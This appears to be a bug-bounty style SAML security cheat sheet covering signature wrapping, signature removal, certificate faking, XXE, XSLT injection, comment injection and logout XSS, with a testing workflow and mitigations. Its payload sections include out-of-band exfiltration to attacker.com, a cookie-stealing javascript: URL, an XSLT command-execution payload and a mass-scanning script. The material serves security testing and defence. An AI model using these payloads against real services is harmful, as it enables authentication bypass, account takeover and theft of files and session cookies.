## 📋 Overview & Theory

**Security Assertion Markup Language (SAML)** is an XML-based framework enabling **Single Sign-On (SSO)** functionality. It facilitates secure communication between **Identity Providers (IdP)** and **Service Providers (SP)**, allowing users to access multiple applications with one set of credentials.

### Key Components:

- **SAML Assertion**: XML message containing user identity and attributes
- **Identity Provider (IdP)**: Service performing authentication and issuing assertions
- **Service Provider (SP)**: Web application the user wants to access

### SAML vs OAuth:

- **SAML**: Enterprise-focused, XML-based, provides greater SSO security control
- **OAuth**: Mobile-friendly, JSON-based, designed for authorization (not authentication)

### Authentication Flow:

```
1. User → Requests Protected Resource → SP
2. SP → Generates SAML Request → Redirects User to IdP
3. IdP → Receives Request → Authenticates User
4. IdP → Validates User → Generates SAML Response
5. User → Redirected to SP's ACS URL → With SAML Response
6. SP → Validates Response → Grants Access
```

### SAML Request Example:

```xml
<?xml version="1.0"?>
<samlp:AuthnRequest 
  xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  AssertionConsumerServiceURL="https://sp.example.com/acs"
  Destination="https://idp.example.com/sso"
  ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST">
  <saml:Issuer>https://sp.example.com</saml:Issuer>
</samlp:AuthnRequest>
```

**Key Elements:**

- `AssertionConsumerServiceURL`: Where IdP sends SAML Response
- `Destination`: IdP address receiving the request
- `ProtocolBinding`: Transmission method for SAML messages
- `saml:Issuer`: Entity initiating the request

### SAML Response Structure:

```xml
<samlp:Response>
  <ds:Signature>...</ds:Signature>
  <saml:Assertion>
    <saml:Subject>...</saml:Subject>
    <saml:Conditions>...</saml:Conditions>
    <saml:AuthnStatement>...</saml:AuthnStatement>
    <saml:AttributeStatement>...</saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```

**Critical Components:**

- `ds:Signature`: Ensures integrity/authenticity
- `saml:Subject`: Principal subject of assertions
- `saml:StatusCode`: Operation status
- `saml:Conditions`: Validity timing and SP specification
- `saml:AttributeStatement`: User attributes

---

## 🔐 XML Signatures - Types & Structure

### Basic XML Signature Structure:

```xml
<Signature>
  <SignedInfo>
    <CanonicalizationMethod />
    <SignatureMethod />
    <Reference URI="#...">
       <Transforms />
       <DigestMethod />
       <DigestValue />
    </Reference>
  </SignedInfo>
  <SignatureValue />
  <KeyInfo />
  <Object />
</Signature>
```

### Signature Types:

**1. Enveloped Signature** (Signature inside signed content):

```xml
<samlp:Response ID="...">
  <ds:Signature>
    <ds:Reference URI="#...">...</ds:Reference>
  </ds:Signature>
</samlp:Response>
```

**2. Enveloping Signature** (Signature wraps signed content):

```xml
<ds:Signature>
  <ds:Reference URI="#...">...</ds:Reference>
  <samlp:Response ID="...">...</samlp:Response>
</ds:Signature>
```

**3. Detached Signature** (Signature separate from content):

```xml
<samlp:Response ID="...">...</samlp:Response>
<ds:Signature>
  <ds:Reference URI="#...">...</ds:Reference>
</ds:Signature>
```

---

## 🎯 Exploitation Methods

### 1. XML Signature Wrapping (XSW) Attacks

**Concept**: Exploit discrepancy between signature validation and application logic by injecting forged elements that don't break signature validity.

#### XSW #1 - New Root Element

**Strategy**: Add new root element containing signature

**Steps to Exploit:**

1. Intercept SAML Response in SAML Raider
2. Select "Apply XSW" → Choose "XSW #1"
3. Modify top assertion value to target account
4. Forward request
5. Verify authentication as victim

```
Impact: Validator confusion between legitimate and evil Response/Assertion/Subject
```

![XSW #1 Structure]

---

#### XSW #2 - Detached Signature Variant

**Difference**: Uses detached signature instead of enveloping

**Exploitation**: Same as XSW #1 but signature placement differs

```
Key Note: XSW #1 and #2 are the only variants manipulating Response elements
```

---

#### XSW #3 - Evil Assertion at Same Level

**Strategy**: Craft evil Assertion at same hierarchical level as original

**Steps:**

1. Intercept SAML Response
2. Apply XSW #3 via SAML Raider
3. Change cloned assertion's user attribute
4. Forward and verify access

```
Impact: Business logic processes malicious assertion instead of signed one
```

---

#### XSW #4 - Original as Child

**Difference**: Original Assertion becomes child of duplicated (evil) Assertion

**Exploitation Pattern**: Similar to XSW #3 but more aggressive structure modification

---

#### XSW #5 - Assertion Envelopes Signature

**Unique Aspect**: Neither Signature nor original Assertion in standard configuration

```xml
<CopiedAssertion>
  <ds:Signature>
    <OriginalAssertion>...</OriginalAssertion>
  </ds:Signature>
</CopiedAssertion>
```

---

#### XSW #6 - Nested Deceptive Structure

**Pattern**: Copied Assertion → Signature → Original Assertion (nested wrapping)

---

#### XSW #7 - Extensions Element Exploitation

**Strategy**: Insert Extensions element with copied Assertion as child

**Why It Works**: Extensions has less restrictive schema, bypassing OpenSAML countermeasures

```xml
<Extensions>
  <EvilAssertion ID="same-as-original">...</EvilAssertion>
</Extensions>
<OriginalAssertion ID="...">
  <ds:Signature>...</ds:Signature>
</OriginalAssertion>
```

---

#### XSW #8 - Reverse Extensions Variant

**Difference**: Original Assertion becomes child of less restrictive element

---

### 🚀 Quick XSW Testing Workflow:

```
1. Login to SSO → Intercept SAML Response
2. Open SAML Raider → Parse assertions
3. Try XSW #1-8 sequentially via "Apply XSW"
4. Change top assertion user value to "admin" or target
5. Forward → Check authentication result
6. Document successful variant
```

**Pro Tip**: XSW #2 and XSW #1 have highest success rates for Response manipulation!

---

### 2. XML Signature Exclusion

**Concept**: Test if SP skips signature validation when Signature element is absent

#### Exploitation Steps:

1. Intercept SAML Response in SAML Raider
2. Click **"Remove Signatures"** button
3. Forward request
4. **If no error**: SP doesn't enforce signatures
5. Tamper with UserID/attributes
6. Verify access to victim account

**Success Indicator**: Application processes unsigned assertion without rejection

---

### 3. Certificate Faking

**Objective**: Test if SP verifies SAML messages are signed by trusted IdP

#### Exploitation Steps:

1. Intercept SAML Response with signature
2. Click **"Send Certificate to SAML Raider Certs"**
3. Navigate to SAML Raider Certificates tab
4. Select imported cert → Click **"Save and Self-Sign"**
5. Return to intercepted request
6. Select self-signed cert from XML Signature dropdown
7. Click **"Remove Signatures"**
8. Click **"(Re-)Sign Message"** or **"(Re-)Sign Assertion"**
9. Forward signed message

**Success Indicator**: Authentication succeeds = SP accepts self-signed certificates

**Impact**: Ability to forge any SAML assertion with arbitrary user data

---

### 4. Token Recipient Confusion (Service Provider Target Confusion)

**Concept**: SP fails to validate intended recipient, accepting tokens meant for different SP

#### Prerequisites:

- Valid account on SP-Legit
- SP-Target and SP-Legit use same IdP

#### Exploitation Steps:

1. Authenticate to SP-Legit via shared IdP
2. Intercept SAML Response intended for SP-Legit
3. Redirect intercepted response to SP-Target
4. SP-Target processes assertion meant for SP-Legit

**Critical Element**: `Recipient` attribute in `SubjectConfirmationData`

```xml
<saml:SubjectConfirmationData 
  Recipient="https://sp-legit.com/acs"
  NotOnOrAfter="..."/>
```

**Attack Scenarios:**

**Scenario 1 - Cross-Department Access:**

```
Developer with SP-Developer account → Intercept token
→ Send to SP-Sales → Gain unauthorized sales dept access
```

**Scenario 2 - Malicious SP Setup:**

```
Attacker creates SP-Malicious → Federates with target IdP
→ Lures victim to authenticate → Stores victim's token
→ Replays token to SP-Target → Impersonates victim
```

---

### 5. XML Round-Trip Vulnerability

**Concept**: Data signed differs from data processed due to encoding/decoding transformations

#### Example Scenario:

```ruby
doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
  <Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

# Original: First child = Y
# After round-trip: First child = Z
```

**Attack Vector**: Craft XML where signature validates Y but application processes Z

**References:**

- [Securing XML Implementations](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
- [SAML Insecure by Design](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

---

### 6. XXE (XML External Entity) Injection

**Concept**: SAML responses are XML documents susceptible to XXE attacks

#### Basic XXE Payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY file SYSTEM "file:///etc/passwd">
  <!ENTITY dtd SYSTEM "http://attacker.com/evil.dtd">
]>
<samlp:Response ID="_df55c0bb...">
  <saml:Issuer>&file;</saml:Issuer>
  <ds:Signature>...</ds:Signature>
</samlp:Response>
```

#### Exploitation Steps:

1. Intercept SAML Response
2. Add DOCTYPE declaration with entity definitions
3. Reference entity in assertion attributes
4. Forward request
5. Check for file content disclosure or OOB callback

#### Advanced XXE - OOB Data Exfiltration:

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
```

**evil.dtd content:**

```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

**Pro Tip**: Use SAML Raider's built-in XXE payloads for rapid testing!

---

### 7. XSLT Injection via SAML

**Critical**: XSLT transformations occur **before** signature verification!

#### Exploitation Payload:

```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  <ds:Transforms>
    <ds:Transform>
      <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="doc">
          <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
          <xsl:variable name="escaped" select="encode-for-uri($file)"/>
          <xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
          <xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
          <xsl:value-of select="unparsed-text($exploitUrl)"/>
        </xsl:template>
      </xsl:stylesheet>
    </ds:Transform>
  </ds:Transforms>
</ds:Signature>
```

#### Steps:

1. Intercept SAML Response
2. Inject XSLT payload inside `<ds:Transforms>`
3. Forward request (invalid signature OK!)
4. Check attacker server for exfiltrated data

**Impact**: File read, SSRF, RCE (depending on XSLT processor)

**Resources**: [YouTube XSLT/XXE Talk](https://www.youtube.com/watch?v=WHn-6xHL7mI)

---

### 8. Simple Assertion Manipulation

**Easiest Attack**: Directly modify user attributes in unsigned/weakly verified assertions

#### Steps:

1. Intercept SAML Response
2. Locate user attribute (email, username, role)
3. Change value:
    
    ```xml
    <saml:AttributeValue>user@email.com</saml:AttributeValue><!-- Change to: --><saml:AttributeValue>admin@email.com</saml:AttributeValue>
    ```
    
4. Forward request
5. Check if authenticated as admin

**Success Rate**: Surprisingly high on poorly configured SPs!

---

### 9. Comment Injection Attacks

#### Variant I - Registration Bypass:

```
Register as: admin<!--comment-->@email.com
SP processes: admin@email.com
Result: Account created with admin privileges
```

#### Variant II - Signature Bypass:

```
Register as: admin@gmail.com<!--comment-->.test
Invalid signature: admin<!--comment-->@gmail.com
Valid signature: admin@gmail.com<!--comment-->.test
SP processes: admin@gmail.com
Result: Signature validates + admin access
```

---

### 10. XSS in Logout Functionality

**Discovery Pattern**: Logout pages often handle URL parameters unsafely

#### Exploitation Example:

**Vulnerable Logout URL:**

```
https://target.com/oidauth/logout
→ Redirects to:
https://target.com/oidauth/prompt?base=https://target.com&return_to=/
```

**XSS Payload:**

```
https://target.com/oidauth/prompt?base=javascript:alert(document.domain);//&return_to=/
```

#### Mass Exploitation Script:

```python
import requests
from colorama import Fore

with open("saml_endpoints.txt") as urlList:
    for url in urlList:
        url2 = url.strip().split("oidauth")[0] + \
               "oidauth/prompt?base=javascript:alert(123);//PAYLOAD&return_to=/"
        
        response = requests.get(url2, verify=False)
        
        if "PAYLOAD" in response.text:
            print(Fore.GREEN + f"[VULN] {url2}")
        else:
            print(Fore.RED + f"[SAFE] {url2}")
```

**Tool**: [SAMLExtractor](https://github.com/fadyosman/SAMLExtractor) - Find SAML endpoints across domains

---

## 🛡️ Additional Attack Vectors

### Predictable Signatures

- Analyze signature generation algorithm
- Test for weak randomness in signature values
- Attempt signature reuse across sessions

### Weak Encryption with Signatures

- Check for outdated crypto algorithms (MD5, SHA1)
- Test downgrade attacks on signature methods
- Verify certificate chain validation

---

## 🔧 Essential Tools

### Primary Tools:

**SAML Raider (Burp Extension)**

- XSW attack automation
- Certificate manipulation
- XXE/XSLT payload generation
- Signature removal/re-signing
- [Download](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)

**SAMLExtractor**

- Extract SAML consume URLs from target list
- Mass vulnerability assessment
- [GitHub](https://github.com/fadyosman/SAMLExtractor)

### Supporting Tools:

- **SAML Encoder/Decoder**: [samltool.com](https://www.samltool.com/encode.php)
- **Burp Suite**: Primary intercepting proxy
- **VulnerableSAMLApp**: [Practice Lab](https://github.com/yogisec/VulnerableSAMLApp)

---

## 🎓 Testing Methodology - Complete Workflow

### Phase 1: Reconnaissance (5-10 min)

```
✓ Identify SAML endpoints
✓ Map SSO flow
✓ Document IdP/SP relationships
✓ Capture sample requests/responses
```

**Google Dorks:**

```
inurl:"/saml2?SAMLRequest="
inurl:"/simplesaml/module.php/core/loginuserpass.php?AuthState="
inurl:"simplesaml/saml2/idp"
```

**Burp Search Patterns:**

```
SAMLResponse
1.PHNhbWx (base64: '<saml')
2.PD94bWw (base64: '<?xml')
```

---

### Phase 2: Signature Testing (15-20 min)

```
1. Test Signature Exclusion
   → Remove signature → Forward → Check response

2. Test Certificate Faking
   → Self-sign cert → Re-sign message → Verify acceptance

3. Test Signature Algorithms
   → Check for MD5/SHA1 → Test algorithm downgrade
```

---

### Phase 3: XSW Attack Suite (20-30 min)

```
For each XSW variant (#1-8):
  ✓ Apply transformation
  ✓ Modify user attribute
  ✓ Forward request
  ✓ Document success/failure
  
Focus: XSW #1, #2 (Response), #3, #4 (Assertion)
```

---

### Phase 4: Injection Attacks (15-20 min)

```
✓ XXE: Test file read + OOB exfiltration
✓ XSLT: Inject transformation payloads
✓ Comment Injection: Test during registration
✓ Simple Manipulation: Direct attribute changes
```

---

### Phase 5: Logic Flaws (10-15 min)

```
✓ Token Recipient Confusion (if multi-SP setup exists)
✓ XML Round-Trip vulnerabilities
✓ Logout XSS testing
```

---

## 💥 Higher Impact Scenarios

### Critical Findings:

**1. Signature Exclusion + Certificate Faking**

```
Impact: Complete authentication bypass
Exploit: Forge arbitrary SAML assertions for any user
Severity: CRITICAL
```

**2. XSW + Admin Role Escalation**

```
Impact: Horizontal/vertical privilege escalation
Exploit: Wrap signed assertion, modify role attributes
Severity: HIGH
```

**3. XXE to RCE**

```
Impact: Server compromise
Exploit: XXE → File read → Credential disclosure → RCE
Severity: CRITICAL
```

**4. Token Recipient Confusion (Cross-Org)**

```
Impact: Cross-organization account takeover
Exploit: Use token from Org A to access Org B resources
Severity: HIGH
```

**5. XSLT to SSRF/RCE**

```
Impact: Internal network access, data exfiltration
Exploit: XSLT processor executes attacker-controlled transformations
Severity: CRITICAL
```

---

## 🎯 Top 10 Modern Payloads

### 1. XXE - OOB Exfiltration

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;%send;
]>
```

### 2. XSLT - File Read + Exfil

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="unparsed-text('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

### 3. XSW #1 - Response Duplication

```xml
<samlp:Response>
  <saml:Assertion>
    <saml:Subject>admin@evil.com</saml:Subject>
  </saml:Assertion>
  <samlp:Response>
    <ds:Signature>...</ds:Signature>
    <saml:Assertion>
      <saml:Subject>user@legit.com</saml:Subject>
    </saml:Assertion>
  </samlp:Response>
</samlp:Response>
```

### 4. Comment Injection - Registration

```
admin<!--h4x0r-->@company.com
```

### 5. XSLT - SSRF

```xml
<xsl:value-of select="unparsed-text('http://internal-service/admin')"/>
```

### 6. XXE - Parameter Entity

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
```

### 7. Role Escalation - Attribute Injection

```xml
<saml:Attribute Name="role">
  <saml:AttributeValue>admin</saml:AttributeValue>
</saml:Attribute>
```

### 8. XSW #7 - Extensions Bypass

```xml
<saml:Extensions>
  <saml:Assertion ID="copied">
    <saml:Subject>admin</saml:Subject>
  </saml:Assertion>
</saml:Extensions>
<saml:Assertion ID="original">...</saml:Assertion>
```

### 9. Logout XSS - JavaScript Protocol

```
/oidauth/prompt?base=javascript:fetch('http://attacker.com/?c='+document.cookie);//
```

### 10. XSLT - RCE (Java Runtime)

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:value-of select="rt:exec(rt:getRuntime(),'calc')"/>
  </xsl:template>
</xsl:stylesheet>
```

---

## 🛡️ Mitigations & Secure Configuration

### For Service Providers:

**1. Signature Validation**

```
✓ Always require valid signatures
✓ Reject unsigned assertions
✓ Validate signature before parsing XML
✓ Use strict schema validation
```

**2. Certificate Verification**

```
✓ Maintain whitelist of trusted IdP certificates
✓ Validate certificate chain
✓ Check certificate revocation status
✓ Reject self-signed certificates
```

**3. XML Parsing Security**

```
✓ Disable external entity processing
✓ Disable DTD processing
✓ Use secure XML parsers (defusedxml, etc.)
✓ Implement strict XSD validation
```

**4. Token Recipient Validation**

```
✓ Verify Recipient attribute matches SP URL
✓ Validate Audience restriction
✓ Check NotBefore/NotOnOrAfter timestamps
✓ Implement replay attack prevention
```

**5. XSLT Processing**

```
✓ Disable XSLT transformations if not needed
✓ Use XSLT processors with security restrictions
✓ Validate transformations before signature checking
```

---

### For Identity Providers:

**1. Assertion Security**

```
✓ Sign all assertions and responses
✓ Use strong signature algorithms (SHA-256+)
✓ Include timestamps and uniqueness identifiers
✓ Encrypt sensitive attributes
```

**2. Certificate Management**

```
✓ Use certificates from trusted CAs
✓ Implement certificate rotation
✓ Publish certificate metadata securely
```

---

### General Best Practices:

```
✓ Keep SAML libraries updated
✓ Implement comprehensive logging
✓ Monitor for anomalous SAML traffic
✓ Conduct regular security assessments
✓ Use security-focused SAML implementations (OpenSAML 3+)
✓ Implement rate limiting on SSO endpoints
✓ Deploy Web Application Firewall (WAF) with SAML rules
```

---

## 📚 Essential References

### Comprehensive Guides:

- [How to Test SAML - Part I](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
- [How to Test SAML - Part II](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)
- [How to Test SAML - Part III](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)

### Research Papers:

- [XSW Attack Paper (USENIX)](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)
- [SAML Token Verification Pitfalls](https://web-in-security.blogspot.com/2014/10/verification-of-saml-tokens-traps-and.html)
- [SSO Attack Surface](https://sso-attacks.org/Main_Page)

### Video Resources:

- [SAML From Hackers Perspective](https://www.youtube.com/watch?v=KEwki41ZWmg&list=PLCwnLq3tOElrEU-KoOdeiixiNCWkeQ99F)
- [XSLT/XXE in SAML](https://www.youtube.com/watch?v=WHn-6xHL7mI)

### Real-World Cases:

- [Uber XSS via SAML](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)
- [HackerOne SAML Reports](https://hackerone.com/reports/136169)

### Additional Resources:

- [Bypassing SAML 2.0 SSO](https://research.aurainfosec.io/bypassing-saml20-SSO/)
- [SAML Security XXE](http://secretsofappsecurity.blogspot.com/2017/01/saml-security-xml-external-entity-attack.html)
- [XXE via SAML](https://seanmelia.wordpress.com/2016/01/09/xxe-via-saml/)
- [Securing XML Implementations](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
- [SAML Insecure by Design](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

---

## 🎯 Quick Reference Mind Maps

![SAML Security Mind Map](https://raw.githubusercontent.com/0xInfection/Stuff/master/mindmaps/mind-map-saml.png)

[Download Complete SAML Checklist PDF](https://drive.google.com/file/d/1iLgbd9IbcYgu4n1yJAVUyYbWnzYXmbyp/view)

---

## 💪 Motivation Boost

🚀 **Every SAML vulnerability you uncover strengthens enterprise security!**

Remember:

- Start with low-hanging fruit (Signature Exclusion, Simple Manipulation)
- Progress to complex attacks (XSW variants, XXE/XSLT)
- Document every finding meticulously
- Celebrate each successful bypass!
